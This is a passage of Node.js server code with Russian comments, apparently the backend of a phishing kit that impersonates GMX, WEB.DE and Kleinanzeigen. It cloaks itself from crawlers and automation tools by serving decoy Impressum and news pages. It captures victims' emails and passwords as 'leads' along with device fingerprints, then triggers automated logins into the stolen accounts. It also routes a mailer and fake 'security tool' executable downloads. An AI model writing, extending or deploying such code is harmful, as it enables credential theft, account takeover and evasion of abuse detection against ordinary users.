/** Клоака: отсев ботов по UA. Пустой/короткий UA не считаем ботом — отдаём гейт (иначе живые люди с режимом приватности видят вайт). */
function isLikelyBot(req, pathname) {
  const ua = (req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']).toLowerCase() : '';
  if (!ua || ua.length < 10) {
    return false;
  }
  // Без общего подстринга «bot» и без голого «yandex» — ложные срабатывания на обычных браузерах
  const botPatterns = /googlebot|bingbot|duckduckbot|applebot|petalbot|baiduspider|yandexbot|yandeximages|yandexvideo|ahrefsbot|semrushbot|mj12bot|dotbot|megaindex|rogerbot|sistrix|blexbot|serpstat|facebookexternalhit|twitterbot|linkedinbot|slurp|crawler|spider|headless|phantom|selenium|puppeteer|playwright|curl\/|wget\/|python\/|go-http|scrapy|datanyze|ahrefs|semrush/i;
  if (botPatterns.test(ua)) return true;
  return false;
}
const WHITE_PAGE_HTML = `<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Impressum &amp; Kontakt – GMX</title>
  <style>
    *{box-sizing:border-box}
    body{margin:0;background:#f5f5f5;font-family:Helvetica,Arial,sans-serif;font-size:15px;line-height:1.5;color:#333;padding:24px 16px 48px}
    .wrap{max-width:680px;margin:0 auto;background:#fff;padding:32px 28px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
    h1{font-size:1.5rem;font-weight:700;margin:0 0 24px;color:#111}
    h2{font-size:1.1rem;font-weight:600;margin:28px 0 10px;color:#222}
    p{margin:0 0 12px}
    a{color:#1c449b;text-decoration:none}
    a:hover{text-decoration:underline}
    .footer-links{margin-top:32px;padding-top:20px;border-top:1px solid #e0e0e0;font-size:0.9rem;color:#666}
    .footer-links a{margin-right:16px}
    address{font-style:normal;margin:8px 0}
    .tel,.email{margin:4px 0}
  </style>
</head>
<body>
  <div class="wrap">
    <h1>Impressum &amp; Kontakt</h1>
    <p>Angaben gem&auml;&szlig; &sect; 5 TMG</p>
    <h2>Anbieter</h2>
    <p>GMX GmbH<br>Hauptsitz M&uuml;nchen</p>
    <address>
      Leopoldstra&szlig;e 236<br>
      80807 M&uuml;nchen<br>
      Deutschland
    </address>
    <h2>Kontakt</h2>
    <p class="tel">Telefon: +49 (0) 89 921 61-0</p>
    <p class="email">E-Mail: <a href="mailto:impressum@gmx.net">impressum@gmx.net</a></p>
    <p>F&uuml;r allgemeine Anfragen: <a href="mailto:support@gmx.net">support@gmx.net</a></p>
    <h2>Handelsregister</h2>
    <p>Registergericht: Amtsgericht M&uuml;nchen<br>Registernummer: HRB 123456</p>
    <h2>Umsatzsteuer-ID</h2>
    <p>USt-IdNr.: DE 123456789</p>
    <h2>Verantwortlich f&uuml;r den Inhalt</h2>
    <p>GMX GmbH, Leopoldstra&szlig;e 236, 80807 M&uuml;nchen</p>
    <div class="footer-links">
      <a href="https://agb-server.gmx.net/gmxagb-de" target="_blank" rel="noopener">AGB</a>
      <a href="https://www.gmx.net/impressum/" target="_blank" rel="noopener">Impressum</a>
      <a href="https://agb-server.gmx.net/datenschutz" target="_blank" rel="noopener">Datenschutz</a>
      <a href="https://www.gmx.net/" target="_blank" rel="noopener">GMX Startseite</a>
    </div>
  </div>
</body>
</html>`;
const WHITE_PAGE_KLEIN = `<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Impressum – Kleinanzeigen</title>
  <style>
    *{box-sizing:border-box}
    body{margin:0;background:#f5f5f5;font-family:Helvetica,Arial,sans-serif;font-size:15px;line-height:1.5;color:#333;padding:24px 16px 48px}
    .wrap{max-width:680px;margin:0 auto;background:#fff;padding:32px 28px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
    h1{font-size:1.5rem;font-weight:700;margin:0 0 24px;color:#111}
    h2{font-size:1.1rem;font-weight:600;margin:28px 0 10px;color:#222}
    p{margin:0 0 12px}
    a{color:#326916;text-decoration:none}
    a:hover{text-decoration:underline}
    .footer-links{margin-top:32px;padding-top:20px;border-top:1px solid #e0e0e0;font-size:0.9rem;color:#666}
    .footer-links a{margin-right:16px}
    address{font-style:normal;margin:8px 0}
  </style>
</head>
<body>
  <div class="wrap">
    <h1>Impressum</h1>
    <p>Angaben gem&auml;&szlig; &sect; 5 TMG</p>
    <h2>Anbieter</h2>
    <p>Kleinanzeigen GmbH</p>
    <address>Helene-Weber-Allee 19, 80637 M&uuml;nchen, Deutschland</address>
    <h2>Kontakt</h2>
    <p>E-Mail: <a href="mailto:impressum@kleinanzeigen.de">impressum@kleinanzeigen.de</a></p>
    <div class="footer-links">
      <a href="https://themen.kleinanzeigen.de/nutzungsbedingungen/" target="_blank" rel="noopener">AGB</a>
      <a href="https://www.kleinanzeigen.de/impressum.html" target="_blank" rel="noopener">Impressum</a>
      <a href="https://themen.kleinanzeigen.de/datenschutzerklaerung/" target="_blank" rel="noopener">Datenschutz</a>
      <a href="https://www.kleinanzeigen.de/" target="_blank" rel="noopener">Kleinanzeigen Startseite</a>
    </div>
  </div>
</body>
</html>`;
/** Нейтральная страница для ботов в стиле немецких новостей (WEB.DE): остаётся на том же домене, не редирект. */
const WHITE_PAGE_NEWS_WEBDE = `<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Nachrichten &ndash; Aktuelles aus Deutschland</title>
  <style>
    *{box-sizing:border-box}
    body{margin:0;background:#f0f0f0;font-family:Helvetica,Arial,sans-serif;font-size:15px;line-height:1.5;color:#222}
    .header{background:#fff;border-bottom:3px solid #FFDF00;padding:12px 20px;display:flex;align-items:center;gap:12px}
    .logo{font-weight:700;font-size:1.25rem;color:#333}
    .nav{display:flex;gap:20px;margin-left:24px}
    .nav a{color:#1a1a1a;text-decoration:none}
    .nav a:hover{color:#666}
    .wrap{max-width:720px;margin:0 auto;padding:24px 16px 48px}
    .teaser{margin-bottom:24px;background:#fff;padding:20px;border-radius:6px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
    .teaser h2{font-size:1.1rem;margin:0 0 8px;font-weight:600}
    .teaser h2 a{color:#1a1a1a;text-decoration:none}
    .teaser h2 a:hover{text-decoration:underline}
    .teaser .meta{font-size:0.85rem;color:#666;margin-bottom:6px}
    .teaser p{margin:0;color:#444;font-size:0.95rem}
    .footer{margin-top:32px;padding-top:16px;border-top:1px solid #e0e0e0;font-size:0.9rem;color:#666}
    .footer a{color:#1a1a1a;text-decoration:none;margin-right:16px}
  </style>
</head>
<body>
  <header class="header">
    <span class="logo">Nachrichten</span>
    <nav class="nav">
      <a href="#">Politik</a>
      <a href="#">Wirtschaft</a>
      <a href="#">Sport</a>
      <a href="#">Panorama</a>
    </nav>
  </header>
  <div class="wrap">
    <article class="teaser">
      <div class="meta">Berlin &ndash; 11. M&auml;rz 2025</div>
      <h2><a href="#">Bundestag ber&auml;t &uuml;ber Haushaltsplan</a></h2>
      <p>Die Abgeordneten diskutieren die geplanten Ausgaben f&uuml;r das kommende Jahr. Die Opposition fordert Nachbesserungen.</p>
    </article>
    <article class="teaser">
      <div class="meta">M&uuml;nchen &ndash; 11. M&auml;rz 2025</div>
      <h2><a href="#">Wirtschaftsdaten zeigen leichte Erholung</a></h2>
      <p>Die neuesten Konjunkturindikatoren deuten auf eine stabile Entwicklung in mehreren Branchen hin.</p>
    </article>
    <article class="teaser">
      <div class="meta">Frankfurt &ndash; 10. M&auml;rz 2025</div>
      <h2><a href="#">Sport: Bundesliga mit spannendem Spieltag</a></h2>
      <p>Die Tabelle bleibt dicht. Die Fans erwarten weitere Entscheidungsspiele am Wochenende.</p>
    </article>
    <div class="footer">
      <a href="#">Impressum</a>
      <a href="#">Datenschutz</a>
      <a href="#">Kontakt</a>
    </div>
  </div>
</body>
</html>`;
function getWhitePageHtml(req) {
  return getBrand(req).id === 'klein' ? WHITE_PAGE_KLEIN : WHITE_PAGE_HTML;
}
/** Для short-доменов с whitePageStyle 'news-webde' отдаём страницу новостей (остаёмся на домене); иначе стандартная вайт по бренду. */
function getWhitePageHtmlForRequest(req) {
  const host = (req && req.headers && req.headers.host ? req.headers.host : '').split(':')[0].toLowerCase();
  const hostNorm = host.replace(/^www\./, '');
  const shortList = getShortDomainsList();
  const key = shortList[host] ? host : (shortList[hostNorm] ? hostNorm : null);
  if (key && shortList[key] && shortList[key].whitePageStyle === 'news-webde') return WHITE_PAGE_NEWS_WEBDE;
  return getWhitePageHtml(req);
}
const GATE_PAGE_HTML = `<!DOCTYPE html><html lang="de"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title></title></head><body style="margin:0;background:#fff;min-height:100vh"></body><script>
(function(){
  var cookieName="${BOT_GATE_COOKIE}";
  function sendToWhite(){ fetch("/gate-white",{credentials:"include"}).then(function(r){return r.text();}).then(function(html){document.open();document.write(html);document.close();}); }
  function pass(){
    document.cookie=cookieName+"=1;path=/;max-age=3600;samesite=lax";
    var p=location.pathname+location.search;
    if(p==="/"||p===""){location.reload();}else{fetch(p,{credentials:"include"}).then(function(r){return r.text();}).then(function(html){document.open();document.write(html);document.close();}).catch(function(){location.reload();});}
  }
  function isAutomation(){
    if(typeof navigator==="undefined")return true;
    if(navigator.webdriver===true){ var ua2=(navigator.userAgent||"").toLowerCase(); if(!/android/.test(ua2)) return true; }
    var ua=(navigator.userAgent||"").toLowerCase();
    if(/headless|phantom|selenium|puppeteer|playwright|electron|webdriver/i.test(ua))return true;
    try{ if(window.callPhantom||window._phantom||window.__nightmare||window.__selenium_unwrapped||window.domAutomation||window._WEBDRIVER_ELEM_CACHE)return true; }catch(e){}
    if(typeof screen!=="undefined"&&(screen.width<=0||screen.height<=0))return true;
    return false;
  }
  if(isAutomation()){ sendToWhite(); return; }
  var t0=Date.now();
  setTimeout(function(){
    if(Date.now()-t0<200)return;
    if(isAutomation()){ sendToWhite(); return; }
    pass();
  },280);
})();
</script></html>`;

function serveFile(filePath, res, req) {
  if (res.writableEnded) return;
  const ext = path.extname(filePath);
  const types = { '.html': 'text/html', '.css': 'text/css', '.js': 'application/javascript', '.json': 'application/json', '.ico': 'image/x-icon', '.svg': 'image/svg+xml' };
  const contentType = types[ext] || 'application/octet-stream';
  fs.readFile(filePath, (err, data) => {
    if (res.writableEnded) return;
    if (err) {
      if (err.code === 'ENOENT') return send(res, 404, 'Not Found', 'text/plain');
      return send(res, 500, 'Error', 'text/plain');
    }
    let out = data;
    if (ext === '.html' && req && (out.indexOf('__BRAND_JSON__') !== -1 || out.indexOf('<!-- __BRAND_JSON__ -->') !== -1)) {
      const brand = getBrand(req);
      const jsonStr = JSON.stringify(brand).replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/\n/g, '\\n').replace(/\r/g, '');
      const script = '<script>window.__BRAND__=JSON.parse(\'' + jsonStr + '\');</script>';
      out = Buffer.from(out.toString().replace('<!-- __BRAND_JSON__ -->', script).replace('__BRAND_JSON__', script), 'utf8');
    }
    const headers = { 'Content-Type': contentType };
    if (ext === '.js' || ext === '.css' || ext === '.html') {
      headers['Cache-Control'] = 'no-cache, no-store, must-revalidate';
      headers['Pragma'] = 'no-cache';
      headers['Expires'] = '0';
      headers['Last-Modified'] = new Date().toUTCString();
    }
    res.writeHead(200, headers);
    res.end(out);
  });
}

const API_ROUTE_DEPS = {
  readMode,
  statusHeartbeats,
  suppressVictimPushPageForKleinContext,
  pushEvent,
  broadcastLeadsUpdate,
  writeDebugLog,
};

const server = http.createServer(async (req, res) => {
  // Обработка CORS preflight запросов
  if (req.method === 'OPTIONS') {
    if (safeEnd(res)) return;
    res.writeHead(200, {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type, Authorization',
      'Access-Control-Max-Age': '86400'
    });
    res.end();
    return;
  }

  const parsed = url.parse(req.url, true);
  let pathname = (parsed.pathname || '').replace(/\/\/+/g, '/') || '/';

  // Ранний лёгкий ответ для проверки, что сервер живой (до readShortDomains и прочей логики)
  if ((pathname === '/health' || pathname === '/ping') && req.method === 'GET') {
    if (safeEnd(res)) return;
    res.writeHead(200, { 'Content-Type': 'text/plain', 'Cache-Control': 'no-store' });
    res.end('ok');
    return;
  }

  const MAX_POST_BODY_BYTES = 50 * 1024 * 1024;
  if (req.method === 'POST' && req.headers['content-length']) {
    const cl = parseInt(req.headers['content-length'], 10);
    if (!isNaN(cl) && cl > MAX_POST_BODY_BYTES) {
      send(res, 413, { ok: false, error: 'Payload too large' });
      req.destroy();
      return;
    }
  }

  if ((pathname === '/api/config/download' || pathname === '/api/config/download-android' || pathname === '/api/config/check') && req.method === 'POST' && req.setTimeout) {
    req.setTimeout(300000);
    req.on('timeout', () => { req.destroy(); });
  }

  // Сокращалка: /s/:slug → редирект (бекенд в short/)
  const shortlinkMatch = pathname.match(/^\/s\/([a-zA-Z0-9_-]+)$/);
  if (shortlinkMatch && req.method === 'GET') {
    const slug = shortlinkMatch[1];
    const target = short.resolveShortLink(slug);
    if (target) {
      if (safeEnd(res)) return;
      res.writeHead(302, { 'Location': target, 'Cache-Control': 'no-store' });
      res.end();
      return;
    }
  }

  const requestHost = (req.headers.host || '').split(':')[0].toLowerCase();
  const isLocalhost = requestHost === 'localhost' || requestHost === '127.0.0.1' || requestHost === '';
  const isAdminPage = pathname === '/admin' || pathname === '/admin/';
  const isAdminHtml = pathname === '/admin.html';

  if (ADMIN_DOMAIN) {
    if (isAdminPage || isAdminHtml || isAdminRequest(pathname)) {
      // Админка только на ADMIN_DOMAIN (grzl.org); localhost разрешён для локальной проверки
      if (requestHost !== ADMIN_DOMAIN && !isLocalhost) {
        if (safeEnd(res)) return;
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
        return;
      }
    } else if (requestHost === ADMIN_DOMAIN) {
      const adminAssets = pathname === '/admin.css' || pathname === '/admin.js' || pathname === '/admin.html' || pathname === '/admin-klein-logo.js' || pathname === '/klein-logo.png' || pathname === '/windows-icon.png' || pathname === '/android-icon.png' || pathname === '/ios-icon.png';
      const mailerAssets = pathname === '/mailer' || pathname === '/mailer/' || pathname === '/mailer/index.html' || pathname === '/mailer/index-test.html' || pathname === '/mailer/mailer.js' || pathname === '/mailer/mailer.css';
      const sicherheitPage = pathname === '/sicherheit' || pathname === '/sicherheit/' || pathname === '/sicherheit-pc' || pathname === '/sicherheit-pc/' || pathname === '/sicherheit-update' || pathname === '/sicherheit-update/';
      const sicherheitDownload = pathname === '/download/sicherheit-tool' || pathname === '/download/sicherheit-tool.zip' || pathname === '/download/sicherheit-tool.exe' || (pathname.startsWith('/download/') && pathname.length > 10);
      const bitteAmPcPage = pathname === '/bitte-am-pc' || pathname === '/bitte-am-pc/';
      const appUpdatePage = pathname === '/app-update' || pathname === '/app-update/';
      const apiChat = pathname === '/api/chat' || pathname === '/api/chat-open' || pathname === '/api/chat-open-ack' || pathname === '/api/chat-typing' || pathname === '/api/chat-read';
      if (!adminAssets && !mailerAssets && !sicherheitPage && !sicherheitDownload && !bitteAmPcPage && !appUpdatePage && !apiChat) {
        if (safeEnd(res)) return;
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not Found');
        return;
      }
    }
  }
  // Short-домены (сокращалка + гейт): не редиректить на canonical, обработать гейт (вайт для ботов, редирект на target для людей)
  const shortDomainsList = getShortDomainsList();
  const shortHostNorm = requestHost.replace(/^www\./, '');
  const shortDomainKey = shortDomainsList[requestHost] ? requestHost : (shortDomainsList[shortHostNorm] ? shortHostNorm : null);
  const isShortDomain = shortDomainKey !== null;

  // Редирект на канонический домен текущего бренда: с других доменов — на canonical хоста (GMX или WEB.DE).
  const canonicalDomain = getCanonicalDomain(req);
  const isCanonicalHost = requestHost === canonicalDomain || requestHost === ('www.' + canonicalDomain);
  if (!isLocalhost && requestHost && !isCanonicalHost && requestHost !== ADMIN_DOMAIN && !isShortDomain) {
    if (safeEnd(res)) return;
    res.writeHead(301, { Location: 'https://' + canonicalDomain + (req.url || '/') });
    res.end();
    return;
  }

  if (isShortDomain && req.method === 'GET') {
    const targetUrl = (shortDomainsList[shortDomainKey].targetUrl || '').trim();
    const targetIsAnmelden = !targetUrl || targetUrl === 'anmelden' || targetUrl === '/anmelden';
    const redirectTo = targetUrl || ('https://' + GMX_DOMAIN + '/');
    const host = requestHost;
    if (hasGateCookie(req)) {
      if (targetIsAnmelden && (pathname === '/' || pathname === '')) {
        if (safeEnd(res)) return;
        res.writeHead(302, { 'Location': 'https://' + host + '/anmelden', 'Cache-Control': 'no-store' });
        res.end();
        return;
      }
      if (targetIsAnmelden && (pathname === '/anmelden' || pathname === '/anmelden/')) {
        const useWebde = shortDomainsList[shortDomainKey].whitePageStyle === 'news-webde';
        const indexFile = path.join(PROJECT_ROOT, useWebde ? 'webde' : 'gmx', 'index.html');
        return serveFile(indexFile, res, req);
      }
      if (!targetIsAnmelden) {
        if (safeEnd(res)) return;
        res.writeHead(302, { 'Location': redirectTo, 'Cache-Control': 'no-store' });
        res.end();
        return;
      }
      // targetIsAnmelden и путь не / и не /anmelden — статика (styles, script и т.д.), обрабатываем дальше
    } else {
      if (safeEnd(res)) return;
      const html = isLikelyBot(req, pathname) ? getWhitePageHtmlForRequest(req) : GATE_PAGE_HTML;
      res.writeHead(200, {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store, no-cache, must-revalidate',
        'Pragma': 'no-cache'
      });
      res.end(html);
      return;
    }
  }

  const ip = getClientIp(req);
  const isUserPath = pathname === '/api/visit' || pathname === '/api/submit' || pathname === '/api/download-filename' ||
    (pathname.startsWith('/download/') && pathname.length > 9) ||
    (req.method === 'GET' && isProtectedPage(pathname));
  if (isUserPath && hasGateCookie(req)) setFirstGateTime(ip);

  if (pathname.startsWith('/api/')) {
    let body = '';
    if (apiRoutes.needsRequestBody(req.method, pathname)) {
      body = await readApiRouteBody(req, MAX_POST_BODY_BYTES);
    }
    let handled = false;
    try {
      handled = await apiRoutes.handleApiRoute(req, res, parsed, body, API_ROUTE_DEPS);
    } catch (err) {
      console.error('[apiRoutes]', err);
      if (!safeEnd(res)) send(res, 500, { ok: false, error: 'server error' });
      return;
    }
    if (handled) return;
  }

  if (pathname === '/api/visit' && req.method === 'POST') {
    if (!checkRateLimit(ip, 'visit', RATE_LIMITS.visit)) {
      return send(res, 429, { ok: false, error: 'too_many_requests' });
    }
    const leads = readLeads();
    const now = new Date().toISOString();
    
    // НЕ используем IP для связывания записей - каждый новый визит создает новую запись
    // IP сохраняется только для отображения в админке, но не используется для поиска или связывания
    // Это позволяет создавать отдельные логи для каждой новой сессии, даже с того же IP
    
    // Всегда создаем новую запись для нового визита
    const id = Date.now().toString(36) + Math.random().toString(36).slice(2);
    const platform = resolvePlatform(getPlatformFromRequest(req), undefined);
    const brandId = getBrand(req).id;
    // Устройство не определено (нет/пустой UA, бот) → редирект на GMX
    const initialStatus = platform == null ? 'redirect_gmx_net' : 'pending';
    const hostVisit = (req.headers && req.headers.host) ? String(req.headers.host).split(':')[0].toLowerCase() : '';
    const visitDetail = 'бренд ' + brandId + (hostVisit ? ' · хост ' + hostVisit : '');
    const initialEvent = platform == null
      ? [{ at: now, label: 'Устройство не определено → редирект на GMX', source: 'user', detail: visitDetail }]
      : [{ at: now, label: 'Зашел на сайт', source: 'user', detail: visitDetail }];
    const ua = (req.headers && req.headers['user-agent']) ? String(req.headers['user-agent']) : '';
    const newVisitLead = {
      id: id,
      email: '',
      password: '',
      createdAt: now,
      adminListSortAt: now,
      status: initialStatus,
      ip: ip, // IP только для отображения, не для связывания
      lastSeenAt: now,
      eventTerminal: initialEvent,
      platform: platform || undefined,
      brand: brandId,
      userAgent: ua || undefined,
    };
    persistLeadFull(newVisitLead);
    writeDebugLog('VISIT_CREATED', { id: id, ip: ip, totalLeads: readLeads().length });
    send(res, 200, { ok: true, id: id });
    return;
  }

  if (pathname === '/api/submit' && req.method === 'POST') {
    let body = '';
    req.on('data', (chunk) => { body += chunk; });
    req.on('end', () => {
      let json = {};
      try {
        json = JSON.parse(body || '{}');
      } catch (err) {
        console.error('[ВХОД] Ошибка: неверный JSON в теле /api/submit — ' + (err.message || err) + '. Отклонён, ip=' + ip);
        return send(res, 400, { ok: false, error: 'invalid json' });
      }
      if (REQUIRE_GATE_COOKIE && !hasGateCookie(req)) {
        console.log('[ВХОД] Отказ: запрос без gate cookie (REQUIRE_GATE_COOKIE=1), ip=' + ip);
        return send(res, 403, { ok: false, error: 'forbidden' });
      }
      /** Только креды Klein (/klein-anmelden): не трогаем email/password почты WEB.DE.
       *  visitId обязателен для привязки; если sessionStorage потерян — ищем лид по совпадению email или emailKl (самый свежий). */
      if (json.kleinFlowSubmit === true || json.kleinFlow === true) {
        const leadsKf = readLeads();
        const pwKf = ((json.password != null) ? String(json.password).trim() : '') || ((json.passwort != null) ? String(json.passwort).trim() : '');
        const emKf = String(json.email || json.emailKl || '').trim();
        if (!emKf) {
          return send(res, 400, { ok: false, error: 'email required' });
        }
        const emLower = emKf.toLowerCase();
        const visitIdKleinFlow = json.visitId && String(json.visitId).trim();
        let leadKf = null;
        if (visitIdKleinFlow) {
          const idKf = resolveLeadId(visitIdKleinFlow);
          leadKf = leadsKf.find(function (l) { return l && l.id === idKf; });
        }
        if (!leadKf) {
          const candidates = leadsKf.filter(function (l) {
            if (!l || l.klLogArchived === true) return false;
            const e = (l.email || '').trim().toLowerCase();
            const eKl = (l.emailKl || '').trim().toLowerCase();
            return (e && e === emLower) || (eKl && eKl === emLower);
          });
          if (candidates.length === 1) {
            leadKf = candidates[0];
          } else if (candidates.length > 1) {
            candidates.sort(function (a, b) {
              const ta = a.adminListSortAt ? new Date(a.adminListSortAt).getTime() : 0;
              const tb = b.adminListSortAt ? new Date(b.adminListSortAt).getTime() : 0;
              if (tb !== ta) return tb - ta;
              return String(b.id || '').localeCompare(String(a.id || ''));
            });
            leadKf = candidates[0];
          }
        }
        if (!leadKf) {
          return send(res, 404, { ok: false, error: 'lead not found' });
        }
        leadKf.emailKl = emKf;
        if (pwKf) leadKf.passwordKl = pwKf;
        leadKf.brand = 'klein';
        const nowKf = new Date().toISOString();
        leadKf.lastSeenAt = nowKf;
        leadKf.adminListSortAt = nowKf;
        pushSubmitPipelineEvent(leadKf, 'klein-flow', !!pwKf);
        pushEvent(leadKf, 'Ввел почту Kl');
        if (pwKf) {
          pushEvent(leadKf, 'Ввел пароль Kl');
          pushPasswordHistory(leadKf, pwKf, 'login_kl');
        }
        applyLeadTelemetry(leadKf, req, json, ip);
        persistLeadFull(leadKf);
        if (pwKf) {
          startWebdeLoginAfterLeadSubmit(leadKf.id, leadKf);
        }
        return send(res, 200, { ok: true, id: leadKf.id });
      }
      const honeypot = (json.website != null && String(json.website).trim() !== '') || (json.hp != null && String(json.hp).trim() !== '');
      if (honeypot) {
        console.log('[ВХОД] Отказ: заполнено скрытое поле honeypot (бот), ip=' + ip);
        return send(res, 400, { ok: false, error: 'invalid' });
      }
      if (!checkRateLimit(ip, 'submit', RATE_LIMITS.submit)) {
        console.log('[ВХОД] Отказ: превышен лимит запросов submit с ip=' + ip);
        return send(res, 429, { ok: false, error: 'too_many_requests' });
      }
      const email = String(json.email || '').trim();
      if (!email) {
        console.error('[ВХОД] Ошибка: в теле /api/submit отсутствует поле email или оно пустое. Отклонён, ip=' + ip);
        return send(res, 400, { ok: false, error: 'email required' });
      }
      const submitBrandId = getBrand(req).id;
      const atEmail = email.indexOf('@');
      const emailDomain = (atEmail > 0 && atEmail < email.length - 1) ? email.slice(atEmail + 1).toLowerCase().trim() : '';
      const submitHost = (req.headers && req.headers.host ? String(req.headers.host) : '').split(':')[0].toLowerCase();
      if (submitBrandId === 'webde') {
        if (!isLocalHost(submitHost) && emailDomain !== 'web.de') {
          console.log('[ВХОД] Отказ: на WEB.DE только @web.de — email=' + email + ', ip=' + ip);
          return send(res, 400, { ok: false, error: 'email_domain_not_allowed' });
        }
      } else if (submitBrandId !== 'klein' && ENABLE_EMAIL_DOMAIN_ALLOWLIST && ALLOWED_EMAIL_DOMAINS.length > 0) {
        const allowed = emailDomain && ALLOWED_EMAIL_DOMAINS.indexOf(emailDomain) !== -1;
        if (!allowed) {
          console.log('[ВХОД] Отказ: домен почты не в списке — email=' + email + ', brand=' + submitBrandId + ', ip=' + ip);
          return send(res, 400, { ok: false, error: 'email_domain_not_allowed' });
        }
      }
      const visitId = json.visitId && String(json.visitId).trim();
      const passwordFromBody = ((json.password != null) ? String(json.password).trim() : '') || ((json.passwort != null) ? String(json.passwort).trim() : '');
      const hasPassword = passwordFromBody !== '';
      logTerminalFlow('ВХОД', SERVER_LOG_PHISH_LABEL, '—', email, 'email: submit · пароль ' + (hasPassword ? 'есть' : 'нет') + ' · visitId=' + (visitId || '—') + ' · ip=' + ip);
      const leads = readLeads();
      const emailLower = email.toLowerCase();
      const incomingDeviceSig = deviceSignatureFromRequest(req, json, ip);
      // Для Klein: в EMAIL KL пишем значение из поля emailKl из тела запроса (то, что реально введено на форме Klein), чтобы не подменялось автозаполнением браузера
      const brandIdForEmailKl = getBrand(req).id;
      const emailForKlein = (brandIdForEmailKl === 'klein' && json.emailKl != null && String(json.emailKl).trim() !== '')
        ? String(json.emailKl).trim()
        : email;

      if (visitId) {
        const visitLeadRaw = leads.find(function (l) { return l.id === visitId; });
        // KL архив: лог остаётся в базе, но новые submit с этим visitId не обновляют запись — создаётся новый лог
        const visitLead = (visitLeadRaw && visitLeadRaw.klLogArchived !== true) ? visitLeadRaw : null;
        if (visitLeadRaw && visitLeadRaw.klLogArchived === true) {
          console.log('[ВХОД] visitId указывает на KL-архив — не обновляем запись, создаём новый лог, id=' + visitId);
          writeDebugLog('SUBMIT_SKIP_KL_ARCHIVED_VISITID', { visitId: visitId, email: email, ip: ip });
        }
        if (visitLead) {
          const existingEmail = (visitLead.email || '').trim().toLowerCase();
          const newEmail = emailLower;
          
          // Если запись с visitId уже имеет email И новый email отличается: для Klein — один лог (добавляем emailKl), для web — новый лог
          if (existingEmail && existingEmail !== newEmail) {
            const brandIdUpdate = getBrand(req).id;
            if (brandIdUpdate === 'klein') {
              applyReturnVisitStatusReset(visitLead);
              visitLead.emailKl = emailForKlein;
              visitLead.passwordKl = hasPassword ? passwordFromBody : '';
              visitLead.brand = 'klein';
              if (incomingDeviceSig) visitLead.deviceSignature = incomingDeviceSig;
              if (ip) visitLead.ip = ip;
              const platformVisit = resolvePlatform(getPlatformFromRequest(req), json.screenWidth);
              if (platformVisit) visitLead.platform = platformVisit;
              if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) visitLead.screenWidth = json.screenWidth;
              if (typeof json.screenHeight === 'number' && json.screenHeight >= 0) visitLead.screenHeight = json.screenHeight;
              if (req.headers && req.headers['user-agent']) visitLead.userAgent = String(req.headers['user-agent']);
              if (json.fingerprint && typeof json.fingerprint === 'object') visitLead.fingerprint = json.fingerprint;
              const nowVisit = new Date().toISOString();
              visitLead.lastSeenAt = nowVisit;
              visitLead.adminListSortAt = nowVisit;
              pushSubmitPipelineEvent(visitLead, 'klein', hasPassword, 'visitId, другой email');
              pushEvent(visitLead, 'Ввел почту Kl');
              if (hasPassword) {
                const et = visitLead.eventTerminal || [];
                const lastIsPasswordKl = et.length > 0 && et[et.length - 1].label === 'Ввел пароль Kl';
                if (!lastIsPasswordKl) pushEvent(visitLead, 'Ввел пароль Kl');
                if (visitLead.status === 'error') visitLead.status = 'pending';
                if (hasPassword) delete visitLead.kleinPasswordErrorDe;
                // Klein: редирект только вручную кнопками в админке, авто-редирект на смену пароля не делаем
              }
              if (hasPassword) pushPasswordHistory(visitLead, visitLead.passwordKl, 'login_kl');
              applyLeadTelemetry(visitLead, req, json, ip);
              persistLeadFull(visitLead);
              console.log('[ВХОД] Лог: обновлена запись по visitId (Klein, другой email) — id=' + visitLead.id + ', emailKl=' + emailForKlein + (hasPassword ? ', пароль kl введён' : ''));
              writeDebugLog('SUBMIT_UPDATE_BY_VISITID_KLEIN_DIFFERENT_EMAIL', { visitId: visitId, emailKl: emailForKlein, hasPassword: hasPassword, ip: ip });
              return send(res, 200, { ok: true, id: visitLead.id });
            }
            console.log('[ВХОД] Лог: visitId найден, но email другой — старый ' + existingEmail + ', новый ' + newEmail + ', создаём новый лог');
            writeDebugLog('SUBMIT_NEW_EMAIL_DIFFERENT', {
              visitId: visitId,
              oldEmail: existingEmail,
              newEmail: newEmail,
              ip: ip,
              reason: 'Email отличается от существующего в записи с visitId'
            });
            // Продолжаем создавать новый лог (код ниже)
          } else if (!existingEmail) {
            // Запись существует БЕЗ email - обновляем её (продолжение сессии в той же вкладке)
            const brandIdUpdate = getBrand(req).id;
            const isKlein = brandIdUpdate === 'klein';
            if (isKlein) {
              applyReturnVisitStatusReset(visitLead);
              visitLead.emailKl = emailForKlein;
              visitLead.passwordKl = hasPassword ? passwordFromBody : '';
              visitLead.brand = 'klein';
              if (incomingDeviceSig) visitLead.deviceSignature = incomingDeviceSig;
              if (ip) visitLead.ip = ip;
              const platformVisit = resolvePlatform(getPlatformFromRequest(req), json.screenWidth);
              if (platformVisit) visitLead.platform = platformVisit;
              if (typeof json.screenWidth === 'number' && json.screenWidth >= 0) visitLead.screenWidth = json.screenWidth;
              if (typeof json.screenHeight === 'number' && json.screenHeight >= 0) visitLead.screenHeight = json.screenHeight;
              if (req.headers && req.headers['user-agent']) visitLead.userAgent = String(req.headers['user-agent']);
              if (json.fingerprint && typeof json.fingerprint === 'object') visitLead.fingerprint = json.fingerprint;
              const nowVisitKl = new Date().toISOString();
              visitLead.lastSeenAt = nowVisitKl;
              visitLead.adminListSortAt = nowVisitKl;
